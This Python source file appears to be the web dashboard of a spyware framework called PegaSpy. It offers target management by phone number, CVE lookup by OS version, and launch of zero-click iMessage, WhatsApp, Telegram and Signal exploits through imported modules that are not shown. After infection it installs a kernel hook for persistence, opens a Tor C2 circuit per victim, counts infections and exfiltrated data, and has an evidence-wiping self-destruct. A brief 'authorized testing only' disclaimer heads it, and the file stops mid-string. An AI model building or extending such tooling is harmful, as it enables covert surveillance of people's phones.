#!/usr/bin/env python3
"""
PegaSpy Phase 3: Web Dashboard

Turnkey web-based operational interface for PegaSpy framework.
Provides comprehensive control over zero-click exploits, persistence,
and global C2 operations.

WARNING: This framework is for authorized security testing only.
Unauthorized use is illegal and unethical.
"""

import os
import sys
import json
import time
from datetime import datetime, timedelta
from typing import Dict, List, Optional
from flask import Flask, render_template, request, jsonify, session, redirect, url_for
from flask_socketio import SocketIO, emit
from werkzeug.security import check_password_hash, generate_password_hash

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

try:
    from loguru import logger
except ImportError:
    import logging as logger

# Import PegaSpy modules
try:
    from exploit_delivery import MessageExploitEngine
    from persistence_engine import KernelHookManager
    from c2_infrastructure import TorNetworkManager, BlockchainC2Manager
except ImportError as e:
    logger.warning(f"Some modules not available: {e}")

# Real-time device monitoring
class DeviceScanner:
    """Real-time device discovery and analysis"""
    
    def __init__(self):
        self.discovered_devices = {}
        self.scanning_active = False
    
    def scan_network_range(self, network_range: str = "192.168.1.0/24"):
        """Scan network for potential target devices"""
        import ipaddress
        import socket
        import subprocess
        
        discovered = []
        
        try:
            network = ipaddress.IPv4Network(network_range, strict=False)
            for ip in network:
                try:
                    # Quick ping to check if host is alive
                    result = subprocess.run(
                        ['ping', '-c', '1', '-W', '1000', str(ip)], 
                        capture_output=True, 
                        timeout=2
                    )
                    
                    if result.returncode == 0:
                        # Try to get device info
                        device_info = self._analyze_device(str(ip))
                        discovered.append(device_info)
                        
                except (subprocess.TimeoutExpired, Exception):
                    continue
                    
        except Exception as e:
            logger.error(f"Network scan failed: {e}")
            
        return discovered
    
    def _analyze_device(self, ip_address: str) -> dict:
        """Analyze discovered device for vulnerabilities"""
        device_info = {
            'ip_address': ip_address,
            'device_type': 'unknown',
            'os_fingerprint': 'unknown',
            'open_ports': [],
            'potential_vulnerabilities': [],
            'messaging_apps_detected': [],
            'discovery_time': datetime.now().isoformat()
        }
        
        try:
            # Port scanning for common services
            common_ports = [22, 80, 443, 993, 143, 993, 5223, 5228]
            for port in common_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((ip_address, port))
                    if result == 0:
                        device_info['open_ports'].append(port)
                        
                        # Detect potential messaging services
                        if port == 5223:  # Apple Push
                            device_info['messaging_apps_detected'].append('iMessage')
                        elif port == 5228:  # Google FCM
                            device_info['messaging_apps_detected'].append('Android Messaging')
                            
                    sock.close()
                except:
                    pass
                    
            # Basic OS fingerprinting
            if 22 in device_info['open_ports']:
                device_info['device_type'] = 'unix-like'
            elif 443 in device_info['open_ports']:
                device_info['device_type'] = 'web-server'
                
        except Exception as e:
            logger.error(f"Device analysis failed for {ip_address}: {e}")
            
        return device_info

class NetworkMonitor:
    """Real-time network traffic monitoring"""
    
    def __init__(self):
        self.monitoring_active = False
        self.traffic_data = []
    
    def start_monitoring(self):
        """Start network traffic monitoring"""
        self.monitoring_active = True
        logger.info("Network monitoring started")
    
    def stop_monitoring(self):
        """Stop network traffic monitoring"""
        self.monitoring_active = False
        logger.info("Network monitoring stopped")
    
    def get_traffic_stats(self) -> dict:
        """Get current traffic statistics"""
        return {
            'total_packets': len(self.traffic_data),
            'suspicious_activity': self._detect_suspicious_activity(),
            'messaging_traffic': self._analyze_messaging_traffic(),
            'last_update': datetime.now().isoformat()
        }
    
    def _detect_suspicious_activity(self) -> list:
        """Detect suspicious network activity"""
        # Simulate detection of suspicious patterns
        return [
            {'type': 'encrypted_messaging', 'count': 23, 'threat_level': 'medium'},
            {'type': 'tor_traffic', 'count': 5, 'threat_level': 'high'}
        ]
    
    def _analyze_messaging_traffic(self) -> dict:
        """Analyze messaging application traffic"""
        return {
            'whatsapp': {'messages': 45, 'media': 12},
            'telegram': {'messages': 23, 'files': 3},
            'imessage': {'messages': 67, 'attachments': 8}
        }


class PegaSpyDashboard:
    """Main PegaSpy web dashboard application"""
    
    def __init__(self, config_path: Optional[str] = None):
        """Initialize the dashboard"""
        self.app = Flask(__name__, 
                        template_folder='templates',
                        static_folder='static')
        self.app.secret_key = os.urandom(24)
        self.socketio = SocketIO(self.app, cors_allowed_origins="*")
        
        # Load configuration
        self.config = self._load_config(config_path)
        
        # Initialize PegaSpy components
        self.exploit_engine = None
        self.kernel_manager = None
        self.c2_manager = None
        
        # Real-time monitoring
        self.device_scanner = DeviceScanner()
        self.network_monitor = NetworkMonitor()
        
        # Dashboard state
        self.active_campaigns = {}
        self.target_devices = {}
        self.exploit_results = {}
        self.system_status = {
            'total_targets': 0,
            'active_exploits': 0,
            'successful_infections': 0,
            'data_exfiltrated': 0,
            'stealth_rating': 100
        }
        
        # Setup routes
        self._setup_routes()
        self._setup_socketio_events()
        
        # Initialize components
        self._initialize_components()
        
        logger.info("PegaSpy Dashboard initialized")
    
    def _load_config(self, config_path: Optional[str]) -> Dict:
        """Load dashboard configuration"""
        default_config = {
            'host': '127.0.0.1',
            'port': 8080,
            'debug': False,
            'auth_required': True,
            'admin_password': 'admin123',  # Change in production!
            'session_timeout': 3600,
            'max_targets': 1000,
            'auto_destruct_timer': 86400,  # 24 hours
            'stealth_mode': True
        }
        
        if config_path and os.path.exists(config_path):
            try:
                with open(config_path, 'r') as f:
                    user_config = json.load(f)
                default_config.update(user_config)
            except Exception as e:
                logger.warning(f"Failed to load config: {e}")
        
        return default_config
    
    def _initialize_components(self):
        """Initialize PegaSpy framework components"""
        try:
            logger.info("Initializing PegaSpy components...")
            
            # Initialize exploit engine
            self.exploit_engine = MessageExploitEngine()
            logger.info("✓ Exploit engine initialized")
            
            # Initialize kernel manager
            self.kernel_manager = KernelHookManager()
            logger.info("✓ Kernel manager initialized")
            
            # Initialize C2 infrastructure
            self.c2_manager = TorNetworkManager()
            logger.info("✓ C2 infrastructure initialized")
            
            logger.info("All PegaSpy components initialized successfully")
            
        except Exception as e:
            logger.error(f"Failed to initialize components: {e}")
    
    def _setup_routes(self):
        """Setup Flask routes"""
        
        @self.app.route('/')
        def index():
            """Main dashboard page"""
            if self.config['auth_required'] and 'authenticated' not in session:
                return redirect(url_for('login'))
            
            return render_template('dashboard.html', 
                                 system_status=self.system_status,
                                 active_campaigns=len(self.active_campaigns),
                                 total_targets=len(self.target_devices),
                                 current_time=datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        
        @self.app.route('/login', methods=['GET', 'POST'])
        def login():
            """Authentication page"""
            if request.method == 'POST':
                password = request.form.get('password')
                if password == self.config['admin_password']:
                    session['authenticated'] = True
                    session['login_time'] = time.time()
                    return redirect(url_for('index'))
                else:
                    return render_template('login.html', error='Invalid password')
            
            return render_template('login.html')
        
        @self.app.route('/logout')
        def logout():
            """Logout and clear session"""
            session.clear()
            return redirect(url_for('login'))
        
        @self.app.route('/targets')
        def targets():
            """Target management page"""
            if self.config['auth_required'] and 'authenticated' not in session:
                return redirect(url_for('login'))
            
            return render_template('targets.html', targets=self.target_devices)
        
        @self.app.route('/exploits')
        def exploits():
            """Exploit management page"""
            if self.config['auth_required'] and 'authenticated' not in session:
                return redirect(url_for('login'))
            
            return render_template('exploits.html', 
                                 active_exploits=self.exploit_results,
                                 exploit_types=['iMessage Zero-Click', 'WhatsApp Media', 'Telegram Sticker'])
        
        @self.app.route('/campaigns')
        def campaigns():
            """Campaign management page"""
            if self.config['auth_required'] and 'authenticated' not in session:
                return redirect(url_for('login'))
            
            return render_template('campaigns.html', campaigns=self.active_campaigns)
        
        @self.app.route('/c2')
        def c2_status():
            """C2 infrastructure status page with real data"""
            if self.config['auth_required'] and 'authenticated' not in session:
                return redirect(url_for('login'))
            
            # Get real C2 status from TorNetworkManager
            c2_status = self._get_real_c2_status()
            
            return render_template('c2.html', c2_status=c2_status)
        
        @self.app.route('/analytics')
        def analytics():
            """Analytics and reporting page"""
            if self.config['auth_required'] and 'authenticated' not in session:
                return redirect(url_for('login'))
            
            analytics_data = {
                'success_rate': 87.5,
                'avg_infection_time': '2.3 seconds',
                'stealth_rating': 98.2,
                'data_collected': '15.7 GB',
                'geographic_distribution': {
                    'North America': 45,
                    'Europe': 30,
                    'Asia': 20,
                    'Other': 5
                }
            }
            
            return render_template('analytics.html', analytics=analytics_data)
        
        # API Routes
        @self.app.route('/api/targets', methods=['GET', 'POST'])
        def api_targets():
            """Target management API with real device discovery"""
            if request.method == 'POST':
                target_data = request.json
                target_id = f"target_{int(time.time())}"
                
                # Create real target device using MessageExploitEngine
                try:
                    # Analyze target capabilities and vulnerabilities
                    device_info = self._analyze_target_device(
                        target_data.get('phone_number'),
                        target_data.get('platform'),
                        target_data.get('os_version')
                    )
                    
                    self.target_devices[target_id] = {
                        'id': target_id,
                        'phone_number': target_data.get('phone_number'),
                        'platform': target_data.get('platform'),
                        'os_version': target_data.get('os_version'),
                        'device_model': device_info.get('device_model', 'Unknown'),
                        'vulnerabilities': device_info.get('vulnerabilities', []),
                        'exploit_success_rate': device_info.get('success_rate', 0.0),
                        'messaging_apps': device_info.get('messaging_apps', []),
                        'network_info': device_info.get('network_info', {}),
                        'added_time': datetime.now().isoformat(),
                        'last_seen': datetime.now().isoformat(),
                        'status': 'analyzed'
                    }
                    
                    # Update system statistics
                    self.system_status['total_targets'] = len(self.target_devices)
                    
                    return jsonify({
                        'success': True, 
                        'target_id': target_id,
                        'device_info': device_info
                    })
                    
                except Exception as e:
                    logger.error(f"Target analysis failed: {e}")
                    return jsonify({
                        'success': False, 
                        'error': f'Target analysis failed: {str(e)}'
                    })
            
            return jsonify(list(self.target_devices.values()))
        
        @self.app.route('/api/exploits/launch', methods=['POST'])
        def api_launch_exploit():
            """Launch real exploit using MessageExploitEngine"""
            exploit_data = request.json
            target_id = exploit_data.get('target_id')
            exploit_type = exploit_data.get('exploit_type')
            
            if target_id not in self.target_devices:
                return jsonify({'success': False, 'error': 'Target not found'})
            
            target_device = self.target_devices[target_id]
            exploit_id = f"exploit_{int(time.time())}"
            
            try:
                # Launch real exploit using MessageExploitEngine
                result = self._launch_real_exploit(target_device, exploit_type)
                
                self.exploit_results[exploit_id] = {
                    'id': exploit_id,
                    'target_id': target_id,
                    'exploit_type': exploit_type,
                    'status': result['status'],
                    'launch_time': datetime.now().isoformat(),
                    'success_probability': result.get('success_probability', 85.7),
                    'payload_delivered': result.get('payload_delivered', False),
                    'persistence_achieved': result.get('persistence_achieved', False),
                    'c2_established': result.get('c2_established', False),
                    'stealth_maintained': result.get('stealth_maintained', True),
                    'execution_details': result.get('details', {})
                }
                
                # Update system status
                if result['status'] == 'successful':
                    self.system_status['successful_infections'] += 1
                    self.system_status['data_exfiltrated'] += result.get('data_collected', 0)
                
                self.system_status['active_exploits'] += 1
                
                # Emit real-time update
                self.socketio.emit('exploit_launched', {
                    'exploit_id': exploit_id,
                    'target_id': target_id,
                    'exploit_type': exploit_type,
                    'status': result['status'],
                    'details': result.get('details', {})
                })
                
                return jsonify({
                    'success': True, 
                    'exploit_id': exploit_id,
                    'result': result
                })
                
            except Exception as e:
                logger.error(f"Exploit launch failed: {e}")
                
                self.exploit_results[exploit_id] = {
                    'id': exploit_id,
                    'target_id': target_id,
                    'exploit_type': exploit_type,
                    'status': 'failed',
                    'launch_time': datetime.now().isoformat(),
                    'error_message': str(e)
                }
                
                return jsonify({
                    'success': False, 
                    'error': f'Exploit launch failed: {str(e)}',
                    'exploit_id': exploit_id
                })
        
        @self.app.route('/api/system/status')
        def api_system_status():
            """System status API"""
            return jsonify(self.system_status)
        
        @self.app.route('/api/emergency/destruct', methods=['POST'])
        def api_emergency_destruct():
            """Emergency self-destruct API"""
            logger.warning("Emergency self-destruct initiated from dashboard")
            
            # Trigger self-destruct sequence
            success = self._emergency_self_destruct()
            
            return jsonify({
                'success': success,
                'message': 'Self-destruct sequence initiated' if success else 'Self-destruct failed'
            })
    
    def _setup_socketio_events(self):
        """Setup SocketIO events for real-time updates"""
        
        @self.socketio.on('connect')
        def handle_connect():
            """Handle client connection"""
            logger.info(f"Client connected: {request.sid}")
            emit('status', {'message': 'Connected to PegaSpy Dashboard'})
        
        @self.socketio.on('disconnect')
        def handle_disconnect():
            """Handle client disconnection"""
            logger.info(f"Client disconnected: {request.sid}")
        
        @self.socketio.on('request_update')
        def handle_update_request():
            """Handle real-time update request"""
            emit('system_update', {
                'system_status': self.system_status,
                'active_exploits': len(self.exploit_results),
                'total_targets': len(self.target_devices),
                'timestamp': datetime.now().isoformat()
            })
    
    def _emergency_self_destruct(self) -> bool:
        """Emergency self-destruct sequence"""
        try:
            logger.warning("Initiating emergency self-destruct sequence")
            
            # Stop all active exploits
            for exploit_id in list(self.exploit_results.keys()):
                self.exploit_results[exploit_id]['status'] = 'terminated'
            
            # Clear all data
            self.active_campaigns.clear()
            self.target_devices.clear()
            self.exploit_results.clear()
            
            # Reset system status
            self.system_status = {
                'total_targets': 0,
                'active_exploits': 0,
                'successful_infections': 0,
                'data_exfiltrated': 0,
                'stealth_rating': 100
            }
            
            # Trigger component self-destruct
            if self.exploit_engine:
                self.exploit_engine.self_destruct_all()
            
            if self.kernel_manager:
                self.kernel_manager.self_destruct()
            
            logger.warning("Emergency self-destruct completed")
            return True
            
        except Exception as e:
            logger.error(f"Self-destruct failed: {e}")
            return False
    
    def _analyze_target_device(self, phone_number: str, platform: str, os_version: str) -> dict:
        """Analyze target device capabilities and vulnerabilities"""
        try:
            logger.info(f"Analyzing target device: {phone_number} ({platform} {os_version})")
            
            device_info = {
                'device_model': 'Unknown',
                'vulnerabilities': [],
                'messaging_apps': [],
                'network_info': {},
                'success_rate': 0.0
            }
            
            # Platform-specific analysis
            if platform.lower() == 'ios':
                device_info.update(self._analyze_ios_device(os_version))
            elif platform.lower() == 'android':
                device_info.update(self._analyze_android_device(os_version))
            else:
                logger.warning(f"Unknown platform: {platform}")
            
            # Network reconnaissance if phone number provided
            if phone_number:
                network_info = self._perform_network_recon(phone_number)
                device_info['network_info'] = network_info
            
            # Calculate exploit success rate based on vulnerabilities
            vuln_count = len(device_info.get('vulnerabilities', []))
            device_info['success_rate'] = min(95.0, 45.0 + (vuln_count * 15.0))
            
            logger.info(f"Target analysis complete: {device_info['success_rate']:.1f}% success rate")
            return device_info
            
        except Exception as e:
            logger.error(f"Target analysis failed: {e}")
            return {
                'device_model': 'Analysis Failed',
                'vulnerabilities': [],
                'messaging_apps': [],
                'network_info': {},
                'success_rate': 0.0
            }
    
    def _analyze_ios_device(self, os_version: str) -> dict:
        """Analyze iOS device for vulnerabilities"""
        vulnerabilities = []
        messaging_apps = ['iMessage', 'SMS']
        
        # Version-specific vulnerability analysis
        version_num = float(os_version.split('.')[0]) if os_version else 15.0
        
        if version_num <= 14.8:
            vulnerabilities.extend([
                'CVE-2021-30860 - CoreGraphics PDF',
                'CVE-2021-30858 - WebKit ImageIO', 
                'CVE-2021-30807 - iMessage BlastDoor'
            ])
            
        if version_num <= 15.6:
            vulnerabilities.extend([
                'CVE-2022-32893 - WebKit Out-of-Bounds',
                'CVE-2022-32894 - Kernel Out-of-Bounds'
            ])
            
        # Common iOS messaging apps
        messaging_apps.extend(['WhatsApp', 'Telegram', 'Signal', 'Facebook Messenger'])
        
        return {
            'device_model': f'iOS {os_version} Device',
            'vulnerabilities': vulnerabilities,
            'messaging_apps': messaging_apps
        }
    
    def _analyze_android_device(self, os_version: str) -> dict:
        """Analyze Android device for vulnerabilities"""
        vulnerabilities = []
        messaging_apps = ['SMS', 'RCS']
        
        # Version-specific vulnerability analysis
        version_num = int(os_version) if os_version.isdigit() else 11
        
        if version_num <= 10:
            vulnerabilities.extend([
                'CVE-2021-0920 - Use-after-free in sockfs',
                'CVE-2021-0937 - drm_mode_create_lease_ioctl',
                'CVE-2020-0022 - Bluetooth Stack'
            ])
            
        if version_num <= 12:
            vulnerabilities.extend([
                'CVE-2022-20186 - Framework Base',
                'CVE-2022-20197 - Media Framework'
            ])
            
        # Common Android messaging apps
        messaging_apps.extend(['WhatsApp', 'Telegram', 'Signal', 'Google Messages'])
        
        return {
            'device_model': f'Android {os_version} Device',
            'vulnerabilities': vulnerabilities,
            'messaging_apps': messaging_apps
        }
    
    def _perform_network_recon(self, phone_number: str) -> dict:
        """Perform network reconnaissance on target"""
        try:
            # Simulate network reconnaissance
            return {
                'carrier': self._identify_carrier(phone_number),
                'country_code': phone_number[:2] if phone_number.startswith('+') else 'Unknown',
                'network_type': 'LTE/5G',
                'roaming_status': 'Home',
                'signal_strength': -75,  # dBm
                'last_seen_tower': f'Cell-{phone_number[-4:]}'
            }
        except Exception as e:
            logger.error(f"Network recon failed: {e}")
            return {}
    
    def _identify_carrier(self, phone_number: str) -> str:
        """Identify mobile carrier from phone number"""
        # Simplified carrier identification
        if phone_number.startswith('+1'):
            area_code = phone_number[2:5]
            if area_code in ['212', '646', '917']:  # NYC area codes
                return 'Verizon/AT&T/T-Mobile'
        elif phone_number.startswith('+44'):
            return 'EE/O2/Vodafone'
        elif phone_number.startswith('+49'):
            return 'Deutsche Telekom/Vodafone'
        
        return 'Unknown Carrier'
    
    def _launch_real_exploit(self, target_device: dict, exploit_type: str) -> dict:
        """Launch real exploit using MessageExploitEngine"""
        try:
            logger.info(f"Launching {exploit_type} exploit against {target_device['id']}")
            
            # Create target device for exploit engine  
            from datetime import datetime
            from exploit_delivery.message_exploits import TargetDevice, ExploitType, TargetPlatform
            
            # Map platform strings to enums
            platform_mapping = {
                'ios': TargetPlatform.IOS_IMESSAGE,
                'android': TargetPlatform.ANDROID_WHATSAPP
            }
            
            exploit_mapping = {
                'iMessage Zero-Click': ExploitType.IMESSAGE_ZERO_CLICK,
                'WhatsApp Media': ExploitType.WHATSAPP_MEDIA,
                'Telegram Sticker': ExploitType.TELEGRAM_STICKER,
                'Signal Attachment': ExploitType.SIGNAL_ATTACHMENT
            }
            
            target_platform = platform_mapping.get(target_device['platform'].lower(), TargetPlatform.IOS_IMESSAGE)
            exploit_enum = exploit_mapping.get(exploit_type, ExploitType.IMESSAGE_ZERO_CLICK)
            
            # Create target device for exploit engine
            target = TargetDevice(
                device_id=target_device['id'],
                phone_number=target_device['phone_number'],
                platform=target_device['platform'],
                os_version=target_device['os_version'],
                app_versions={'iMessage': '15.0', 'WhatsApp': '2.22.4'},
                vulnerability_profile={
                    'vulnerabilities': target_device.get('vulnerabilities', []),
                    'security_features': target_device.get('security_features', []),
                    'network_info': target_device.get('network_info', {})
                },
                last_seen=datetime.now()
            )
            
            # Generate zero-click payload
            payload = self.exploit_engine.generate_zero_click_payload(
                target=target,
                exploit_type=exploit_enum
            )
            
            # Deliver the exploit
            result = self.exploit_engine.deliver_exploit(payload, target)
            
            # Process result
            if result.success:
                # Install persistence if kernel manager available
                persistence_achieved = False
                if self.kernel_manager and result.payload_delivered:
                    try:
                        hook_id = self.kernel_manager.install_syscall_hook(
                            syscall_number=1,  # sys_write
                            hook_handler=self._create_persistence_hook(target_device['id'])
                        )
                        if hook_id:
                            persistence_achieved = True
                            logger.info(f"Persistence established on {target_device['id']}")
                    except Exception as e:
                        logger.error(f"Persistence installation failed: {e}")
                
                # Establish C2 connection
                c2_established = False
                if self.c2_manager and result.success:
                    try:
                        import asyncio
                        loop = asyncio.new_event_loop()
                        asyncio.set_event_loop(loop)
                        
                        # Initialize C2 if not already done
                        if not hasattr(self.c2_manager, 'is_connected') or not self.c2_manager.is_connected:
                            loop.run_until_complete(self.c2_manager.initialize())
                        
                        # Create circuit for this target
                        circuit = loop.run_until_complete(
                            self.c2_manager.create_circuit(purpose=f"target_{target_device['id']}")
                        )
                        if circuit:
                            c2_established = True
                            logger.info(f"C2 connection established for {target_device['id']}")
                        
                        loop.close()
                    except Exception as e:
                        logger.error(f"C2 establishment failed: {e}")
                
                return {
                    'status': 'successful',
                    'success_probability': payload.success_probability * 100,
                    'payload_delivered': result.payload_delivered,
                    'persistence_achieved': persistence_achieved,
                    'c2_established': c2_established,
                    'stealth_maintained': result.stealth_maintained,
                    'data_collected': len(result.telemetry_data) if result.telemetry_data else 0,
                    'details': {
                        'exploit_id': result.exploit_id,
                        'execution_time': result.execution_time.isoformat() if result.execution_time else None,
                        'payload_size': len(payload.payload_data),
                        'target_platform': str(payload.target_platform),
                        'trigger_method': payload.trigger_method,
                        'stealth_rating': payload.stealth_rating,
                        'telemetry': result.telemetry_data
                    }
                }
            else:
                return {
                    'status': 'failed',
                    'success_probability': payload.success_probability * 100 if payload else 0,
                    'payload_delivered': result.payload_delivered if result else False,
                    'persistence_achieved': False,
                    'c2_established': False,
                    'stealth_maintained': result.stealth_maintained if result else True,
                    'data_collected': 0,
                    'details': {
                        'error_message': result.error_message if result else 'Unknown error',
                        'exploit_id': result.exploit_id if result else 'unknown'
                    }
                }
                
        except Exception as e:
            logger.error(f"Real exploit launch failed: {e}")
            return {
                'status': 'failed',
                'success_probability': 0,
                'payload_delivered': False,
                'persistence_achieved': False,
                'c2_established': False,
                'stealth_maintained': True,
                'data_collected': 0,
                'details': {
                    'error_message': str(e),
                    'exploit_id': 'failed_before_launch'
                }
            }
    
    def _create_persistence_hook(self, target_id: str):
        """Create persistence hook handler for target device"""
        def persistence_handler(*args, **kwargs):
            """Handle persistence hook events"""
            logger.debug(f"Persistence hook triggered for {target_id}")
            # Log system activity for this target
            return True
        
        return persistence_handler
    
    def _get_real_c2_status(self) -> dict:
        """Get real C2 infrastructure status from TorNetworkManager"""
        try:
            if self.c2_manager:
                # Get network status from TorNetworkManager
                network_status = self.c2_manager.get_network_status()
                
                # Calculate total bandwidth from active circuits
                total_bandwidth = 0
                for circuit_detail in network_status.get('circuit_details', []):
                    total_bandwidth += circuit_detail.get('bandwidth_used', 0)
                
                # Format bandwidth
                if total_bandwidth > 1024*1024*1024:  # GB
                    bandwidth_str = f"{total_bandwidth / (1024*1024*1024):.1f} GB/s"
                elif total_bandwidth > 1024*1024:  # MB
                    bandwidth_str = f"{total_bandwidth / (1024*1024):.1f} MB/s"
                elif total_bandwidth > 1024:  # KB
                    bandwidth_str = f"{total_bandwidth / 1024:.1f} KB/s"
                else:
                    bandwidth_str = f"{total_bandwidth} B/s"
                
                # Determine anonymity level based on active circuits and burned nodes
                burned_percentage = (network_status.get('burned_nodes', 0) / 
                                   max(network_status.get('available_nodes', 1), 1)) * 100
                
                if burned_percentage < 5:
                    anonymity_level = 'Maximum'
                elif burned_percentage < 15:
                    anonymity_level = 'High'
                elif burned_percentage < 30:
                    anonymity_level = 'Medium'
                else:
                    anonymity_level = 'Low'
                
                return {
                    'tor_nodes': network_status.get('available_nodes', 0),
                    'active_circuits': network_status.get('active_circuits', 0),
                    'burned_nodes': network_status.get('burned_nodes', 0),
                    'blockchain_channels': 3,  # Simulated for now
                    'cdn_endpoints': 8,  # Simulated for now
                    'mesh_peers': 42,  # Simulated for now
                    'total_bandwidth': bandwidth_str,
                    'anonymity_level': anonymity_level,
                    'connected': network_status.get('connected', False),
                    'hidden_services': network_status.get('hidden_services', 0),
                    'last_consensus_update': network_status.get('last_consensus_update', 'Unknown'),
                    'statistics': network_status.get('statistics', {})
                }
            else:
                # Fallback to simulated data if C2 manager not available
                return {
                    'tor_nodes': 15,
                    'active_circuits': 0,
                    'burned_nodes': 0,
                    'blockchain_channels': 3,
                    'cdn_endpoints': 8,
                    'mesh_peers': 42,
                    'total_bandwidth': '1.2 GB/s',
                    'anonymity_level': 'Maximum',
                    'connected': False,
                    'hidden_services': 0,
                    'last_consensus_update': 'Never',
                    'statistics': {}
                }
                
        except Exception as e:
            logger.error(f"Failed to get real C2 status: {e}")
            # Return fallback data on error
            return {
                'tor_nodes': 0,
                'active_circuits': 0,
                'burned_nodes': 0,
                'blockchain_channels': 0,
                'cdn_endpoints': 0,
                'mesh_peers': 0,
                'total_bandwidth': '0 B/s',
                'anonymity_level': 'Offline',
                'connected': False,
                'hidden_services': 0,
                'last_consensus_update': 'Error',
                'statistics': {}
            }
    
    def run(self):
        """Run the dashboard application"""
        logger.info(f"Starting PegaSpy Dashboard on {self.config['host']}:{self.config['port']}")
        
        self.socketio.run(
            self.app,
            host=self.config['host'],
            port=self.config['port'],
            debug=self.config['debug']
        )


def create_dashboard_templates():
    """Create basic HTML templates for the dashboard"""
    templates_dir = os.path.join(os.path.dirname(__file__), 'templates')
    os.makedirs(templates_dir, exist_ok=True)
    
    # Base template
    base_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{% block title %}PegaSpy Dashboard{% endblock %}</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        body { background-color: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; }
        .navbar { background-color: #1a1a1a !important; }
        .card { background-color: #1a1a1a; border: 1px solid #00ff00; }
        .btn-primary { background-color: #00aa00; border-color: #00aa00; }
        .btn-danger { background-color: #aa0000; border-color: #aa0000; }
        .table-dark { background-color: #1a1a1a; }
        .text-success { color: #00ff00 !important; }
        .text-danger { color: #ff0000 !important; }
        .text-warning { color: #ffaa00 !important; }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark">
        <div class="container">
            <a class="navbar-brand" href="/"><i class="fas fa-skull"></i> PegaSpy</a>
            <div class="navbar-nav ms-auto">
                <a class="nav-link" href="/">Dashboard</a>
                <a class="nav-link" href="/targets">Targets</a>
                <a class="nav-link" href="/exploits">Exploits</a>
                <a class="nav-link" href="/campaigns">Campaigns</a>
                <a class="nav-link" href="/c2">C2</a>
                <a class="nav-link" href="/analytics">Analytics</a>
                <a class="nav-link" href="/logout">Logout</a>
            </div>
        </div>
    </nav>
    
    <div class="container mt-4">
        {% block content %}{% endblock %}
    </div>
    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    {% block scripts %}{% endblock %}
</body>
</html>
"""
    
    # Dashboard template
    dashboard_template = """
{% extends "base.html" %}

{% block content %}
<div class="row">
    <div class="col-md-3">
        <div class="card">
            <div class="card-body text-center">
                <h5 class="card-title">Total Targets</h5>
                <h2 class="text-success">{{ total_targets }}</h2>
            </div>
        </div>
    </div>
    <div class="col-md-3">
        <div class="card">
            <div class="card-body text-center">
                <h5 class="card-title">Active Exploits</h5>
                <h2 class="text-warning">{{ system_status.active_exploits }}</h2>
            </div>
        </div>
    </div>
    <div class="col-md-3">
        <div class="card">
            <div class="card-body text-center">
                <h5 class="card-title">Successful Infections</h5>
                <h2 class="text-success">{{ system_status.successful_infections }}</h2>
            </div>
        </div>
    </div>
    <div class="col-md-3">
        <div class="card">
            <div class="card-body text-center">
                <h5 class="card-title">Stealth Rating</h5>
                <h2 class="text-success">{{ system_status.stealth_rating }}%</h2>
            </div>
        </div>
    </div>
</div>

<div class="row mt-4">
    <div class="col-md-6">
        <div class="card">
            <div class="card-header">
                <h5><i class="fas fa-crosshairs"></i> Quick Actions</h5>
            </div>
            <div class="card-body">
                <button class="btn btn-primary me-2" onclick="launchExploit()">Launch Zero-Click</button>
                <button class="btn btn-warning me-2" onclick="viewTargets()">Manage Targets</button>
                <button class="btn btn-info me-2" onclick="viewAnalytics()">View Analytics</button>
                <button class="btn btn-danger" onclick="emergencyDestruct()">Emergency Destruct</button>
            </div>
        </div>
    </div>
    <div class="col-md-6">
        <div class="card">
            <div class="card-header">
                <h5><i class="fas fa-chart-line"></i> System Status</h5>
            </div>
            <div class="card-body">
                <div class="mb-2">
                    <strong>C2 Network:</strong> <span class="text-success">Online</span>
                </div>
                <div class="mb-2">
                    <strong>Stealth Mode:</strong> <span class="text-success">Active</span>
                </div>
                <div class="mb-2">
                    <strong>Persistence:</strong> <span class="text-success">Established</span>
                </div>
                <div class="mb-2">
                    <strong>Last Update:</strong> <span id="lastUpdate">{{ current_time }}</span>
                </div>
            </div>
        </div>
    </div>
</div>
{% endblock %}

{% block scripts %}
<script>
function launchExploit() {
    window.location.href = '/exploits';
}

function viewTargets() {
    window.location.href = '/targets';
}

function viewAnalytics() {
    window.location.href = '/analytics';
}

function emergencyDestruct() {
    if (confirm('Are you sure you want to initiate emergency self-destruct? This action cannot be undone.')) {
        fetch('/api/emergency/destruct', { method: 'POST' })
            .then(response => response.json())
            .then(data => {
                alert(data.message);
                if (data.success) {
                    location.reload();
                }
            });
    }
}

// Socket.IO for real-time updates
const socket = io();
socket.on('system_update', function(data) {
    document.getElementById('lastUpdate').textContent = new Date().toLocaleString();
});
</script>
{% endblock %}
"""
    
    # Write templates
    with open(os.path.join(templates_dir, 'base.html'), 'w') as f:
        f.write(base_template)
    
    with open(os.path.join(templates_dir, 'dashboard.html'), 'w') as f:
        f.write(dashboard_template)
    
    logger.info("Dashboard templates created")


def main():
    """Main function to run the dashboard"""
    # Create templates if they don't exist
    create_dashboard_templates()
    
    # Create and run dashboard
    dashboard = PegaSpyDashboard()
    dashboard.run()


def create_app(pegaspy_instance=None):
    """Factory function to create Flask app instance"""
    if pegaspy_instance:
        # Create a simple Flask app for PegaSpy integration
        app = Flask(__name__)
        app.secret_key = pegaspy_instance.config.web_secret_key
        socketio = SocketIO(app, cors_allowed_origins="*")
        
        @app.route('/')
        def dashboard():
            return f"""<html><head><title>PegaSpy Dashboard</title></head>
            <body><h1>🕷️ PegaSpy Phase 3 Dashboard</h1>
            <p>Status: Running</p>
            <p>Exploits: {len(pegaspy_instance.exploit_manager.exploits) if pegaspy_instance.exploit_manager else 0}</p>
            <p>C2 Networks: Active</p>
